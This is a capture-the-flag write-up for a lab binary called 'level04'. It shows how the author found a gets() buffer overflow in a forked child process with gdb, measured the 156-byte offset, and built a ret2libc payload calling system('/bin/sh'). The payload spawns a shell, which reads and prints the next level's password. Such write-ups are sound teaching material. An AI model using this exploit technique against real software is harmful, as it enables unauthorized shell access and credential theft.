# Level04

## Setup

We find a binary file at the root of the user **`level04`** named *`./level04`*.

```bash
scp -r -P 4242 level04@<vm_ip>:/home/users/level04/level04 .
```

### Hex-Rays

We used the Hex-Rays output on the [Dogbolt website](https://dogbolt.org/).


## Source
```C
char s[128];
__pid_t v9;

v9 = fork();
...
gets(s);
```
s is size 128 but we can write as much as we want inside thanks to `gets(s)`

The only issue is that `gets(s)` is called in a child process and gdb doesn't check child processes by default, we need to add this option : `follow-fork-mode child`

### gdb
```bash
> set follow-fork-mode child
> r < <(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'")

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2572]
0x41326641 in ?? ()
```
Overflow at offset `156`

### Payload
	system(), exit() and "/bin/sh" are at the same addresses as before
```bash
> python -c "print 'A'*156 + '\xf7\xe6\xae\xd0'[::-1] + '\xf7\xe5\xeb\x70'[::-1] + '\xF7\xF8\x97\xEC'[::-1]" > /tmp/payload04
> cat /tmp/payload04 - | ./level04 
Give me some shellcode, k
> cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```